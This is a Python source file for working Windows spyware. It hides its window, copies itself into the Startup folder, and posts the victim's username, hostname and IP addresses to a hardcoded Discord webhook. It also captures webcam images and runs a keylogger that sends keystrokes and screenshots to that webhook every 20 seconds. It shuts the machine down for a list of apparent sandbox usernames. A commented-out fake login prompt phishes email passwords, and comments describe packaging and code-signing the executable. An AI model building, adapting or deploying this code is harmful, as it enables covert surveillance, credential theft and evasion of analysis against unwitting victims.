import win32gui, win32con

the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)

#pyinstaller -w -F -i C:\Users\tilov\Downloads\test-main\watdahel_muE_icon.ico test.py
#signtool.exe sign /f test.pfx /fd SHA256 /p TomaTo test-0.6-I.exe
from PIL import ImageGrab, Image
from dhooks import Webhook
from threading import Timer
from pynput.keyboard import Listener
from datetime import datetime
import requests
from requests import get
import json
import os
import shutil
import sys
import time
import socket
import webbrowser as wb
import getpass
import re
import cv2

def check_user_login():
    while not os.getlogin():
        time.sleep(5)
check_user_login()

thisfilename = os.path.basename(sys.argv[0])
destination = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', thisfilename)
if not os.path.exists(destination):
    shutil.copyfile(sys.argv[0], destination)

DEVNAME = "tilov"

def internet(host="8.8.8.8", port=53, timeout=3):
    """
    Host: 8.8.8.8 (google-public-dns-a.google.com)
    OpenPort: 53/tcp
    Service: domain (DNS/TCP)
    """
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        return True
    except socket.error as ex:
        return False

if internet() == False:
    print("no internet connection... exiting in 10 seconds.")
    time.sleep(10)
    exit(1)

if internet() == True:

    hostname = socket.gethostname()
    IPPri = socket.gethostbyname(hostname)
    IPPub = get('https://api.ipify.org').text

    def get_username_os():
        return os.getenv("USERNAME")
    username = get_username_os()

    timenow = datetime.now().time()
    print(timenow)

    time.sleep(1)
    if username == DEVNAME:
        print('Dev found.')
        DEV = "[DEV: **__true__**]"
        DEVT = 'True'
    else:
        DEV = ""
        DEVT = 'False'

    hook = Webhook('https://discord.com/api/webhooks/1233410596167221369/uQV4e2bAYeoP1PCm2i5ur68-uhJ15bgvhBbg0CN159sawhZ8UKscnQpD79yflVa_lmEi')
    hook.send(f"-----\n{DEV} ||<@691670319248965694>|| \n\nUSERNAME:                         {username} \nHOSTNAME:                         {hostname} \nPRIVATE IPADDRESS:        {IPPri} \nPUBLIC IPADRESS:             {IPPub}\n-----")

    # if not username == DEVNAME:
    #     #####
    #
    #     def is_valid_email(email):
    #         # Verwenden eines regulären Ausdrucks, um die Gültigkeit der E-Mail-Adresse zu überprüfen
    #         pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    #         return re.match(pattern, email) is not None
    #
    #     def send_to_webhook(email, password):
    #         # URL des Webhooks anpassen
    #         webhook_url = "https://discord.com/api/webhooks/1233410596167221369/uQV4e2bAYeoP1PCm2i5ur68-uhJ15bgvhBbg0CN159sawhZ8UKscnQpD79yflVa_lmEi"
    #
    #         # Erstellen eines Webhook-Objekts
    #         hook = Webhook(webhook_url)
    #
    #         # Nachricht für den Webhook erstellen
    #         message = f"-----\n# NEW LOGIN\nEMAIL:                                   {email}\nPASSWORD:                         {password}\nUSERNAME:                         {username}\nHOSTNAME:                         {hostname}\n-----"
    #
    #         # Nachricht an den Webhook senden
    #         hook.send(message)
    #
    #     print("Please log in.")
    #
    #     while True:
    #         email = input("E-Mail-Adress: ")
    #         if is_valid_email(email):
    #             break
    #         else:
    #             print("Invalid E-Mail-Adress.")
    #
    #     password = getpass.getpass("Password: ")
    #
    #     time.sleep(1.5)
    #     print("You are now logged in.")
    #
    #     send_to_webhook(email, password)
    #
    #     #####
    # else: print("skipping login")

    if not username == DEVNAME: wb.open('https://www.youtube.com/watch?v=uHgt8giw1LY&ab_channel=Licale')

if username == "Administrator" or username == "Admin" or username == "george" or username == "Abby" or username == "John" or username == "Bruno" or username == "Janet Van Dyne" or username == "russes" or username == "Harry Johnson":
    print("sorry but you are blocked... exiting in 5 seconds")
    time.sleep(5)
    hook.send(f"----- \n# PC SHUTDOWN \nUSERNAME: {username} \nHOSTNAME: {hostname} \n-----")
    os.system('shutdown /p')
    time.sleep(1)
    exit('1')

if username == DEVNAME:
    print("skipping 0-100%")
else:
    # LOADING 0-100%, welcome
    for i in range(101):
        print(f"{i}%")
        time.sleep(0.075)
time.sleep(1)
print(f"Welcome, {username}!")

WEBHOOK_URL = 'https://discord.com/api/webhooks/1233410596167221369/uQV4e2bAYeoP1PCm2i5ur68-uhJ15bgvhBbg0CN159sawhZ8UKscnQpD79yflVa_lmEi'
TIME_INTERVAL = 20  # Amount of time between each report, expressed in seconds.

webhook_url = "https://discord.com/api/webhooks/1233410596167221369/uQV4e2bAYeoP1PCm2i5ur68-uhJ15bgvhBbg0CN159sawhZ8UKscnQpD79yflVa_lmEi"

def main(webhook_url):
    camera_index = 0
    while True:
        ret, image = capture_image(camera_index)
        if ret:
            send_image_to_webhook(image, webhook_url)
        else:
            # Wenn keine Kamera an diesem Index vorhanden ist, breche die Schleife ab
            break
        camera_index += 1

def send_image_to_webhook(image, webhook_url):
    _, img_encoded = cv2.imencode('.jpg', image)
    response = requests.post(webhook_url, files={'image.jpg': img_encoded.tobytes()})
    if response.status_code == 200:
        print("Bild erfolgreich an Webhook gesendet.")
    else:
        print("Fehler beim Senden des Bildes an den Webhook.")

def capture_image(camera_index):
    cap = cv2.VideoCapture(camera_index)
    if not cap.isOpened():
        print(f"Kamera {camera_index} ist nicht verfügbar.")
        return False, None
    ret, frame = cap.read()
    cap.release()
    return ret, frame

class Keylogger:
    def __init__(self, webhook_url, interval):
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.log = ""

    def _report(self): #            TIME: {get_time_os}
        timenow = datetime.now().time()
        if self.log != '':
            self.webhook.send(f"{DEV} *USER*: **{username}** ~~*TIME: {timenow}*~~ {self.log}")
            self.log = ''
            if DEVT == 'True':
                print("SENT")

            # Take a screenshot
            screenshot = ImageGrab.grab(all_screens=True)

            # Save the screenshot to a file
            screenshot_filename = f"C:/Users/{username}/Downloads/screenshot.png"
            screenshot.save(screenshot_filename)

            # Send the screenshot to the webhook
            with open(screenshot_filename, "r+b") as f:
                    file = {"file": f}
                    payload = {"content": f"{DEV} *USER*: **{username}** ~~*TIME: {timenow}*~~".format(time.strftime("%Y-%m-%d %H:%M:%S"))}
                    r = requests.post(WEBHOOK_URL, data=payload, files=file)

            # Delete the screenshot file
            os.remove(screenshot_filename)

        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        self.log += str(key)

    def run(self):
        self._report()
        with Listener(self._on_key_press) as t:
            t.join()

main(webhook_url)
if __name__ == '__main__':
    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()

#else: print("start canceled")
#time.sleep(1)

# for t in range(9):
#     print(f"closing in {10 - t} seconds")
#     time.sleep(1)
# print("closing in 1 second")
# time.sleep(1)
